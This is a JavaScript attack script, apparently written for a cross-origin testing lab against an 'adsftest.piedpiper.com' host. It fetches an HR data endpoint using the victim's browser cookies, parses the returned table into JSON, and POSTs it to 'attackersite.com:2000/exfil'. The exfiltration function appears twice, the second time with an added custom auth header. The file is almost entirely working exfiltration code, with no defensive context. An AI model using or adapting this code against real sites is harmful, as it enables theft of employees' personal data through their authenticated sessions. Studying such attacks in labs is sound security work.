async function fetchHRData() {
    try {
        const response_login = await fetch('https://adsftest.piedpiper.com:3000/auto_login',{method: 'GET',credentials:"include"});
        const body2 = await response_login.text();

        const response = await fetch('https://adsftest.piedpiper.com:3000/hr_data',{method: 'GET',credentials:"include"});
        
        // Print all response headers
        console.log('Response Headers:');
        for (let [key, value] of response.headers.entries()) {
            console.log(`${key}: ${value}`);
        }
        
        // Get and print the response body
        const body = await response.text();
        console.log('\nResponse Body:');
        console.log(body);
        
    } catch (error) {
        console.error('Error fetching data:', error);
    }
}

// Call the function
fetchHRData();

async function exfiltrateHRData() {
    try {
        // Step 1: Fetch the HR data
        const response = await fetch('https://adsftest.piedpiper.com:3000/hr_data', { credentials: 'include' });
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        // Step 2: Get the HTML content
        const html = await response.text();

        // Step 3: Parse the HTML to extract table data
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const table = doc.querySelector('table');
        if (!table) {
            throw new Error('No table found in the response');
        }

        // Get table headers
        const headers = Array.from(table.querySelectorAll('th')).map(th => th.textContent.trim().toLowerCase().replace(/\s+/g, '_'));

        // Get table rows (excluding header row)
        const rows = Array.from(table.querySelectorAll('tr')).slice(1); // Skip header row

        // Convert table data to JSON
        const jsonData = rows.map(row => {
            const cells = Array.from(row.querySelectorAll('td')).map(td => td.textContent.trim());
            return headers.reduce((obj, header, index) => {
                obj[header] = cells[index];
                return obj;
            }, {});
        });

        // Log the JSON data for verification
        console.log('Extracted JSON data:', JSON.stringify(jsonData, null, 2));

        // Step 4: Send the JSON data to the attacker's server
        const exfilResponse = await fetch('https://attackersite.com:2000/exfil', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(jsonData)
        });

        if (!exfilResponse.ok) {
            throw new Error(`Exfil request failed! status: ${exfilResponse.status}`);
        }

        console.log('Data successfully exfiltrated to https://attackersite.com:2000/exfil');

    } catch (error) {
        console.error('Error during exfiltration:', error);
    }
}

// Call the function
exfiltrateHRData();


async function exfiltrateHRData() {
    try {
        // Step 1: Fetch the HR data
        const response = await fetch('https://adsftest.piedpiper.com:8000/hr_data', 
            { 
                credentials: 'include',
                headers: {
                    'X-Custom-Auth-Header':'super_secret_token'
                }
            }
        );
        
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        // Step 2: Get the HTML content
        const html = await response.text();

        // Step 3: Parse the HTML to extract table data
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const table = doc.querySelector('table');
        if (!table) {
            throw new Error('No table found in the response');
        }

        // Get table headers
        const headers = Array.from(table.querySelectorAll('th')).map(th => th.textContent.trim().toLowerCase().replace(/\s+/g, '_'));

        // Get table rows (excluding header row)
        const rows = Array.from(table.querySelectorAll('tr')).slice(1); // Skip header row

        // Convert table data to JSON
        const jsonData = rows.map(row => {
            const cells = Array.from(row.querySelectorAll('td')).map(td => td.textContent.trim());
            return headers.reduce((obj, header, index) => {
                obj[header] = cells[index];
                return obj;
            }, {});
        });

        // Log the JSON data for verification
        console.log('Extracted JSON data:', JSON.stringify(jsonData, null, 2));

        // Step 4: Send the JSON data to the attacker's server
        const exfilResponse = await fetch('https://attackersite.com:2000/exfil', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(jsonData)
        });

        if (!exfilResponse.ok) {
            throw new Error(`Exfil request failed! status: ${exfilResponse.status}`);
        }

        console.log('Data successfully exfiltrated to https://attackersite.com:2000/exfil');

    } catch (error) {
        console.error('Error during exfiltration:', error);
    }
}

// Call the function
exfiltrateHRData();